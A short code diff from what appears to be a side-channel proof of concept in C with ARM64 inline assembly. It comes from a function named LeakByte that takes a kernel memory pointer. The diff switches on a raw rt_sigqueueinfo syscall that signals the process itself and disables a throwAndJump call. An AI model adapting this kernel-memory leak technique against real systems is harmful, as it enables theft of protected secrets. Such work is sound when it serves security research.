@@ -116,15 +116,15 @@ static char LeakByte(const char *data, size_t offset, size_t x, char *kernel_mem
     // );
 
     //--- System call along with pointer to rotation index of secret string-------------------
-    // asm volatile(
-    //     "mov x8, %0\n"           // System call number for rt_sigqueueinfo
-    //     "mov x0, %1\n"           // Process ID (getpid)
-    //     "mov x1, %2\n"           // Signal number (SIGUSR1)
-    //     "mov x2, %3\n"           // Pointer to sigval (value)
-    //     "svc #0\n"               // Make the system call
-    //     :: "r"(__NR_rt_sigqueueinfo), "r"(getpid()), "r"(SIGUSR1), "r"(&sig_data_struct)
-    //     : "x0", "x1", "x2", "x8"
-    // );
+    asm volatile(
+        "mov x8, %0\n"           // System call number for rt_sigqueueinfo
+        "mov x0, %1\n"           // Process ID (getpid)
+        "mov x1, %2\n"           // Signal number (SIGUSR1)
+        "mov x2, %3\n"           // Pointer to sigval (value)
+        "svc #0\n"               // Make the system call
+        :: "r"(__NR_rt_sigqueueinfo), "r"(getpid()), "r"(SIGUSR1), "r"(&sig_data_struct)
+        : "x0", "x1", "x2", "x8"
+    );
     // sigqueue(getpid(), SIGUSR1, sig_data);
     // mod_data++;  
     // asm volatile(
@@ -136,7 +136,7 @@ static char LeakByte(const char *data, size_t offset, size_t x, char *kernel_mem
     // mode = (mode >> 2) & 0b11;
 
     
-    throwAndJump(&mod_data);
+    // throwAndJump(&mod_data);
     // asm volatile(
     //     "mov x0, %0\n"  // Move the address of mod_data (the argument) into register x0
     //     "bl throwAndJump\n"  // Branch to throwAndJump (function call)
